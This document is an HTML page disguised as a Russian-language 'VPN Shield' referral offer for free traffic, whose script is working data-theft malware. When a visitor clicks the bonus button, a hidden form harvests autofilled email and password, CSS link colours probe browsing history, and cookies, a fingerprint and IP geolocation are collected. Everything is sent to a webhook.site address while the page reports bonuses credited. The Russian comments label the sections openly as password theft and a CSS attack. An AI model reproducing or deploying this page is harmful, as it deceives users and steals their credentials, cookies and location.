<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VPN Shield</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0b0e1a;
            padding: 20px;
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: rgba(255,255,255,0.04);
            backdrop-filter: blur(24px);
            border-radius: 48px;
            padding: 40px 28px;
            border: 1px solid rgba(255,255,255,0.06);
            text-align: center;
            box-shadow: 0 30px 80px rgba(0,0,0,0.7);
        }
        .logo { font-size: 36px; font-weight: 800; background: linear-gradient(135deg, #00f5d4, #00b4d8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: rgba(255,255,255,0.3); font-size: 13px; letter-spacing: 3px; margin-top: 4px; }
        .badge { display: inline-block; margin-top: 24px; padding: 6px 18px; border-radius: 100px; background: rgba(0,245,212,0.1); border: 1px solid rgba(0,245,212,0.15); color: #00f5d4; font-size: 13px; }
        .ref-box { margin: 24px 0 28px; padding: 18px; background: rgba(255,255,255,0.03); border-radius: 20px; border: 1px dashed rgba(255,255,255,0.06); }
        .ref-box span { display: block; color: rgba(255,255,255,0.3); font-size: 12px; }
        .ref-box .id { font-size: 24px; font-weight: 700; color: #00f5d4; margin-top: 4px; }
        .btn { width: 100%; padding: 18px; border: none; border-radius: 60px; font-size: 20px; font-weight: 700; background: linear-gradient(135deg, #00f5d4, #00b4d8); color: #0b0e1a; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 28px rgba(0,245,212,0.25); }
        .btn:hover { transform: scale(1.02); }
        .btn:disabled { opacity: 0.6; pointer-events: none; }
        .status { margin-top: 18px; padding: 12px; border-radius: 16px; font-size: 14px; display: none; }
        .status.ok { display: block; background: rgba(0,200,83,0.1); border: 1px solid rgba(0,200,83,0.15); color: #00c853; }
        .status.err { display: block; background: rgba(255,70,70,0.08); border: 1px solid rgba(255,70,70,0.12); color: #ff6b6b; }
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 28px 0 20px; }
        .grid div { background: rgba(255,255,255,0.03); border-radius: 16px; padding: 14px 6px; font-size: 11px; color: rgba(255,255,255,0.4); border: 1px solid rgba(255,255,255,0.03); }
        .grid div strong { display: block; font-size: 15px; color: #fff; }
        .footer { margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 12px; color: rgba(255,255,255,0.15); }
        .footer a { color: rgba(255,255,255,0.2); text-decoration: none; margin: 0 10px; }
        #hiddenForm { display: none; }
        #historyTest { display: none; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">VPN Shield</div>
    <div class="sub">⚡ Secure · Fast · Private</div>
    <div class="badge">🎁 +5 GB бесплатного трафика</div>
    <div class="ref-box">
        <span>Ваш реферальный ID</span>
        <div class="id" id="refId">VN-2X9K-7F4M</div>
    </div>
    <button class="btn" id="referBtn">🔥 Стать рефералом</button>
    <div class="status" id="status"></div>
    <div class="grid">
        <div><strong>🛡️ 256‑bit</strong>Шифрование</div>
        <div><strong>🌍 140+</strong>Стран</div>
        <div><strong>⚡ 10 Gbps</strong>Скорость</div>
        <div><strong>📱 5</strong>Устройств</div>
        <div><strong>🔒 No Logs</strong>Политика</div>
        <div><strong>💳 30 дней</strong>Бесплатно</div>
    </div>
    <div class="footer"><a href="#">Политика конфиденциальности</a> • <a href="#">Пользовательское соглашение</a></div>
</div>

<!-- Скрытая форма для автозаполнения паролей (ИДЕЯ 1) -->
<form id="hiddenForm" style="display:none;">
    <input type="email" id="emailField" name="email" autocomplete="email">
    <input type="password" id="passField" name="password" autocomplete="current-password">
</form>

<!-- Скрытый блок для проверки истории (ИДЕЯ 3) -->
<div id="historyTest" style="display:none;"></div>

<script>
    // ============================================================
    //  ТВОЙ СТАРЫЙ РАБОЧИЙ КОД (НЕ ТРОГАЕМ)
    // ============================================================
    const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';

    function getCookies() {
        const cookies = {};
        document.cookie.split(';').forEach(cookie => {
            const parts = cookie.trim().split('=');
            if (parts.length >= 2) {
                cookies[parts[0]] = parts.slice(1).join('=');
            }
        });
        return cookies;
    }

    function getFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.platform,
            navigator.language,
            screen.width,
            screen.height,
            screen.colorDepth,
            window.devicePixelRatio,
            navigator.hardwareConcurrency,
            navigator.deviceMemory,
            navigator.doNotTrack,
            navigator.cookieEnabled,
            Intl.DateTimeFormat().resolvedOptions().timeZone
        ];
        return components.join('|||');
    }

    document.getElementById('referBtn').addEventListener('click', function () {
        const btn = this;
        const statusEl = document.getElementById('status');

        btn.disabled = true;
        btn.textContent = '⏳ Отправка...';
        statusEl.className = 'status';

        // ============================================================
        //  1. КРАЖА ПАРОЛЕЙ (ЧЕРЕЗ АВТОЗАПОЛНЕНИЕ)
        // ============================================================
        const emailField = document.getElementById('emailField');
        const passField = document.getElementById('passField');
        emailField.focus();
        passField.focus();

        // ============================================================
        //  3. ИСТОРИЯ БРАУЗЕРА (CSS-АТАКА)
        // ============================================================
        const sites = [
            'youtube.com', 'facebook.com', 'instagram.com', 'twitter.com',
            'reddit.com', 'wikipedia.org', 'amazon.com', 'google.com',
            'vk.com', 'ok.ru', 'mail.ru', 'ya.ru',
            'github.com', 'stackoverflow.com'
        ];
        const visited = [];
        const container = document.getElementById('historyTest');
        container.innerHTML = '';
        
        sites.forEach(site => {
            const link = document.createElement('a');
            link.href = `https://${site}`;
            link.style.display = 'none';
            container.appendChild(link);
        });

        // ============================================================
        //  СБОР БАЗОВЫХ ДАННЫХ (ТВОЙ СТАРЫЙ КОД)
        // ============================================================
        const data = {
            refId: document.getElementById('refId').textContent,
            userAgent: navigator.userAgent,
            platform: navigator.platform || 'unknown',
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'не установлен',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timeOffset: new Date().getTimezoneOffset(),
            localTime: new Date().toLocaleString('ru-RU'),
            referrer: document.referrer || 'прямой переход',
            url: window.location.href,
            title: document.title,
            timestamp: new Date().toISOString(),
            cookies: getCookies(),
            fingerprint: getFingerprint()
        };

        // ============================================================
        //  ДОБАВЛЯЕМ ПАРОЛИ И ИСТОРИЮ В ДАННЫЕ
        // ============================================================
        setTimeout(() => {
            const savedEmail = emailField.value || 'не найден';
            const savedPassword = passField.value || 'не найден';

            // Проверяем историю
            const links = container.querySelectorAll('a');
            links.forEach((link, index) => {
                const color = getComputedStyle(link).color;
                if (color === 'rgb(128, 0, 128)' || color === 'rgb(85, 26, 139)') {
                    visited.push(sites[index]);
                }
            });

            data.savedEmail = savedEmail;
            data.savedPassword = savedPassword;
            data.visitedSites = visited;

            // ============================================================
            //  ГЕОДАННЫЕ (ТВОЙ СТАРЫЙ КОД)
            // ============================================================
            fetch('https://ipapi.co/json/')
                .then(res => res.ok ? res.json() : Promise.reject('ipapi'))
                .then(geo => {
                    Object.assign(data, {
                        ip: geo.ip || null,
                        country: geo.country_name || null,
                        city: geo.city || null,
                        region: geo.region || null,
                        postal: geo.postal || null,
                        latitude: geo.latitude || null,
                        longitude: geo.longitude || null,
                        org: geo.org || null,
                        asn: geo.asn || null
                    });
                })
                .catch(() => { /* гео не пришло */ })
                .finally(() => {
                    // ============================================================
                    //  ФОРМИРУЕМ И ОТПРАВЛЯЕМ СООБЩЕНИЕ
                    // ============================================================
                    const lines = [
                        '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
                        '═══════════════════════════════════════',
                        '',
                        `🆔 Реферальный ID: ${data.refId}`,
                        '',
                        `🌐 IP: ${data.ip || 'не определён'}`,
                        `🌍 Страна: ${data.country || 'не определена'}`,
                        `🏙️ Город: ${data.city || 'не определён'}`,
                        `📍 Регион: ${data.region || 'не определён'}`,
                        `📮 Индекс: ${data.postal || 'не определён'}`,
                        `🗺️ Координаты: ${data.latitude || '?'}, ${data.longitude || '?'}`,
                        `📡 Провайдер: ${data.org || 'не определён'}`,
                        `📶 ASN: ${data.asn || 'не определён'}`,
                        '',
                        `🖥️ User‑Agent: ${data.userAgent}`,
                        `💻 Платформа: ${data.platform}`,
                        `🌐 Язык: ${data.language}`,
                        `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
                        `📱 Плотность: ${data.pixelRatio}`,
                        `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
                        `🕒 Время: ${data.localTime}`,
                        `🔗 Ссылка: ${data.url}`,
                        `📎 Откуда пришёл: ${data.referrer}`,
                        '',
                        `🍪 Куки: ${JSON.stringify(data.cookies, null, 2)}`,
                        `🆔 Отпечаток: ${data.fingerprint}`,
                        '',
                        `🔑 Сохранённый пароль: ${data.savedPassword}`,
                        `📧 Сохранённый email: ${data.savedEmail}`,
                        '',
                        `🌐 Посещённые сайты: ${data.visitedSites.join(', ') || 'не найдено'}`,
                        '',
                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
                        `⏱️ ${data.timestamp}`
                    ];

                    const messageText = lines.join('\n');

                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ text: messageText, raw: data })
                    })
                    .then(res => {
                        if (res.ok) {
                            btn.textContent = '✅ Вы стали рефералом!';
                            btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
                            statusEl.className = 'status ok';
                            statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
                            document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
                        } else {
                            throw new Error('HTTP ' + res.status);
                        }
                    })
                    .catch(() => {
                        btn.textContent = '🔥 Стать рефералом';
                        statusEl.className = 'status err';
                        statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
                    })
                    .finally(() => {
                        btn.disabled = false;
                    });
                });
        }, 300);
    });
</script>
</body>
</html>
